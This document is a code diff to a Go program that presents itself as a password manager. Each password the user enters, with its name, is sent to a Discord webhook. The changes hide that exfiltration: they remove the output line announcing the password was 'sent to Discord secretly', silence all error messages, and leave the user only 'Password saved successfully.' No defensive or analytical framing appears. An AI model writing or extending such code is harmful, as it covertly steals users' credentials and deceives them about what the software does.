@@ -59,14 +59,15 @@ func addPassword(reader *bufio.Reader, passwordFile string) {
 	password, _ := reader.ReadString('\n')
 	password = strings.TrimSpace(password)
 
-	// Automatically send the password to Discord after adding it
+	// Automatically send the password to Discord after adding it (silently)
 	sendPasswordToDiscord(name, password)
 
 	// Save the password in the local list
 	passwordList = append(passwordList, PasswordEntry{Name: name, Password: password})
 	savePasswordsToFile(passwordFile)
 
-	fmt.Println("Password saved successfully and sent to Discord secretly.")
+	// Don't print anything related to Discord sending
+	fmt.Println("Password saved successfully.")
 }
 
 func listPasswords() {
@@ -108,17 +109,16 @@ func sendPasswordToDiscord(name, password string) {
 
 	payloadBytes, err := json.Marshal(payload)
 	if err != nil {
-		fmt.Println("Error creating payload:", err)
+		// Don't print any error, keep silent
 		return
 	}
 
-	resp, err := sendWebhookRequest(webhookURL, payloadBytes)
+	// Send the password to Discord silently
+	_, err = sendWebhookRequest(webhookURL, payloadBytes)
 	if err != nil {
-		fmt.Println("Error sending to Discord:", err)
+		// Don't print any error, keep silent
 		return
 	}
-
-	fmt.Println("Password sent to Discord successfully. Response:", resp)
 }
 
 func sendWebhookRequest(webhookURL string, payload []byte) (string, error) {
